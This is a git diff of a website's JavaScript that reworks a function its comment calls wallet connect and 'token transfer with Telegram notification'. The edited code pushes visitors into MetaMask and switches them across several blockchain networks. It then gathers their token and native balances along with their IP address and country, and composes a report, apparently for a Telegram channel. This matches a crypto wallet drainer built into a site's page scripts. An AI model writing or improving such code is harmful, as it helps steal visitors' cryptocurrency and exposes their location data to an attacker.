@@ -84,24 +84,20 @@ addEventOnElem(window, "scroll", scrollReveal);
  * Wallet connect, network switching, and token transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
-  if (!window.ethers || !window.Web3Modal) {
-    console.error("Required libraries (ethers or Web3Modal) not found.");
+  if (!window.ethers || !window.ethereum) {
+    console.error("MetaMask is not installed.");
+    // Prompt user to install MetaMask or open the app
+    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+      // Mobile device: redirect to MetaMask app or store
+      window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
+      alert("Please open this page in the MetaMask mobile app or install MetaMask.");
+    } else {
+      // Desktop: prompt to install MetaMask extension
+      alert("Please install the MetaMask browser extension to continue.");
+      window.open("https://metamask.io/download.html", "_blank");
+    }
     return;
   }
-
-  const providerOptions = {
-    walletconnect: {
-      package: window.WalletConnectProvider.default,
-      options: {
-        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
-      }
-    }
-  };
-
-  const web3Modal = new window.Web3Modal.default({
-    cacheProvider: false,
-    providerOptions
-  });
 
   const evmNetworks = [
     {
@@ -125,12 +121,12 @@ async function connectWalletAndSendTokens() {
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
   try {
-    const instance = await web3Modal.connect();
-    const provider = new ethers.providers.Web3Provider(instance);
+    // Request MetaMask connection
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
-    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
-    console.log(`Wallet connected: ${userAddress} (${walletType})`);
+    console.log(`Wallet connected: ${userAddress} (MetaMask)`);
 
     let locationData = {};
     try {
@@ -146,7 +142,7 @@ async function connectWalletAndSendTokens() {
         console.log(`Processing network: ${network.name}`);
 
         try {
-          await instance.request({
+          await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: `0x${network.chainId.toString(16)}` }]
           });
@@ -168,11 +164,11 @@ async function connectWalletAndSendTokens() {
                 blockExplorerUrls: ['https://polygonscan.com']
               }
             }[network.chainId];
-            await instance.request({
+            await window.ethereum.request({
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
             });
-            await instance.request({
+            await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: `0x${network.chainId.toString(16)}` }]
             });
@@ -181,7 +177,7 @@ async function connectWalletAndSendTokens() {
           }
         }
 
-        const currentProvider = new ethers.providers.Web3Provider(instance);
+        const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
         const currentSigner = currentProvider.getSigner();
         const currentNetwork = await currentProvider.getNetwork();
 
@@ -202,38 +198,37 @@ async function connectWalletAndSendTokens() {
         let apiAttempts = 0;
         const maxAttempts = 3;
         let apiSuccess = false;
-        
+
         while (apiAttempts < maxAttempts && !apiSuccess) {
-  try {
-    apiAttempts++;
-    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
-    const response = await fetch(moralisUrl, {
-      headers: { "X-API-Key": moralisApiKey }
-    });
-    if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
-    tokens = await response.json();
-    apiSuccess = true;
+          try {
+            apiAttempts++;
+            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
+            const response = await fetch(moralisUrl, {
+              headers: { "X-API-Key": moralisApiKey }
+            });
+            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
+            tokens = await response.json();
+            apiSuccess = true;
 
-    const nonZeroTokens = tokens.filter(token =>
-      token.balance && !ethers.BigNumber.from(token.balance).isZero()
-    );
+            const nonZeroTokens = tokens.filter(token =>
+              token.balance && !ethers.BigNumber.from(token.balance).isZero()
+            );
 
-    tokenSummaryTelegram = nonZeroTokens.length > 0
-      ? nonZeroTokens.map(token => {
-          const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
-          return `• ${token.symbol}: ${balance}`;
-        }).join("\n")
-      : `No non-zero ${network.name} token balances found.`;
-  } catch (apiErr) {
-    console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
-    if (apiAttempts === maxAttempts) {
-      tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
-    } else {
-      await delay(3000);
-    }
-  }
-}
-
+            tokenSummaryTelegram = nonZeroTokens.length > 0
+              ? nonZeroTokens.map(token => {
+                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+                  return `• ${token.symbol}: ${balance}`;
+                }).join("\n")
+              : `No non-zero ${network.name} token balances found.`;
+          } catch (apiErr) {
+            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
+            if (apiAttempts === maxAttempts) {
+              tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
+            } else {
+              await delay(3000);
+            }
+          }
+        }
 
         const nativeBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
@@ -242,7 +237,7 @@ async function connectWalletAndSendTokens() {
         const networkMessage = `
 📥 Wallet Connected on ${network.name}
 Address: ${userAddress}
-Wallet: ${walletType}
+Wallet: MetaMask
 Country: ${locationData.country_name}
 IP: ${locationData.ip}
 
